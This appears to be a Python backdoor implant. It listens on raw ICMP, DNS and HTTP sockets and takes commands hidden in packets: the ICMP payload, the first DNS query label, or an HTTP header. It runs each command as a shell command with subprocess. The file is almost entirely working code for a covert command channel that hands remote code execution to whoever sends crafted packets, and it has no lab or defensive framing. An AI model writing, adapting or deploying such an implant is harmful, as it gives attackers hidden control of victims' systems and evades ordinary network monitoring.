import socket
import struct
import subprocess


def decode_icmp_packet(packet):
    icmp_header = packet[20:28]  # Skip the IP header (20 bytes) and get the ICMP header
    icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq = struct.unpack("!BBHHH", icmp_header)
    data = packet[28:].decode("utf-8")
    return {
        "icmp_type": icmp_type,
        "icmp_code": icmp_code,
        "icmp_checksum": icmp_checksum,
        "icmp_id": icmp_id,
        "icmp_seq": icmp_seq,
        "data": data
    }

def icmp_server(bind_ip, bind_port):
    # Create a raw socket to handle ICMP packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.bind((bind_ip, bind_port))

    while True:
        packet, addr = sock.recvfrom(4096)
        icmp_data = decode_icmp_packet(packet)
        print(f"Received ICMP packet from {addr}: {icmp_data}")
        # Execute the received command and get the output
        command = icmp_data["data"]
        try:
            output = subprocess.check_output(command, shell=True)
            print(output.decode("utf-8"))
        except:
            continue


def decode_dns_packet(packet):
    udp_payload = packet[28:]  # Skip the IP header (20 bytes) and UDP header (8 bytes)
    
    transaction_id, flags, qdcount, ancount, nscount, arcount = struct.unpack("!6H", udp_payload[:12])
    question = udp_payload[12:]

    domain_name = []
    i = 0
    while i < len(question):
        length = question[i]
        if length == 0:
            break
        domain_name.append(question[i+1:i+1+length].decode("utf-8"))
        i += length + 1
    domain_name =  ".".join(domain_name)

    command = domain_name.split('.')[0].replace("^", " ").replace("?", ".")

    qtype, qclass = struct.unpack("!2H", question[len(domain_name) + 2:len(domain_name) + 6])

    return {
        "transaction_id": transaction_id,
        "flags": flags,
        "qdcount": qdcount,
        "ancount": ancount,
        "nscount": nscount,
        "arcount": arcount,
        "domain_name": domain_name,
        "qtype": qtype,
        "qclass": qclass,
        "command": command,
    }

def dns_server(bind_ip, bind_port):
    # Create a UDP socket to handle DNS packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    sock.bind((bind_ip, bind_port))

    while True:
        packet, addr = sock.recvfrom(4096)
        dns_data = decode_dns_packet(packet)
        print(f"Received DNS packet from {addr}: {dns_data}")
        command = dns_data["command"]
        try:
            output = subprocess.check_output(command, shell=True)
            print(output.decode("utf-8"))
        except:
            continue


def decode_http_packet(packet):
    tcp_payload = packet[40:]  # Skip the IP header (20 bytes) and TCP header (20 bytes)

    def parse_http_request(http_request):
        request_line, *headers = http_request.split("\r\n")
        method, path, version = request_line.split(" ")
        return {
            "method": method,
            "path": path,
            "version": version,
            "headers": headers,
        }

    http_request = tcp_payload.decode("utf-8")
    http_data = parse_http_request(http_request)

    return http_data

def http_server(bind_ip, bind_port):
    # Create a TCP socket to handle HTTP packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.bind((bind_ip, bind_port))

    while True:
        # client_sock, addr = sock.accept()
        packet, addr = sock.recvfrom(4096)
        http_data = decode_http_packet(packet)
        print(f"Received HTTP packet from {addr}: {http_data}")
        command = http_data["headers"][1].split(":")[1]
        try:
            output = subprocess.check_output(command, shell=True)
            print(output.decode("utf-8"))
        except:
            continue


if __name__ == "__main__":
    bind_ip = "0.0.0.0"
    bind_port = 0  # Bind to an arbitrary port; the port number is not used for raw sockets
    icmp_server(bind_ip, bind_port)

    bind_port = 53  # Bind to port 53 for DNS
    # dns_server(bind_ip, bind_port)

    bind_port = 80  # Bind to port 80 for HTTP
    #http_server(bind_ip, bind_port)
